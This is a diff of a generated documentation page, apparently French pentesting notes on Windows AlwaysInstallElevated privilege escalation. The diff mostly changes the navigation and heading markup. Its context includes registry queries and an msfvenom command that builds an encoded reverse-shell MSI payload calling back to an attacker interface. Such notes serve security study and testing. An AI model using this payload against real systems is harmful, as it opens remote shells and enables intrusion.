@@ -6572,6 +6572,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#creation-dun-reverse-shell-avec-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Création d'un Reverse Shell avec MSFVenom
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -7905,6 +7914,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#creation-dun-reverse-shell-avec-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Création d'un Reverse Shell avec MSFVenom
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -7935,7 +7953,7 @@
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
 </span></code></pre></div>
 <p>Ces commandes vérifient si le paramètre est activé dans les registres HKCU (HKEY_CURRENT_USER) et HKLM (HKEY_LOCAL_MACHINE). Une réponse "0x1" indique que le paramètre est activé.  </p>
-<p>Création d'un Reverse Shell avec MSFVenom</p>
+<h4 id="creation-dun-reverse-shell-avec-msfvenom">Création d'un Reverse Shell avec MSFVenom</h4>
 <ul>
 <li>
 <p><strong>Commande :</strong> <code>msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi</code>  </p>
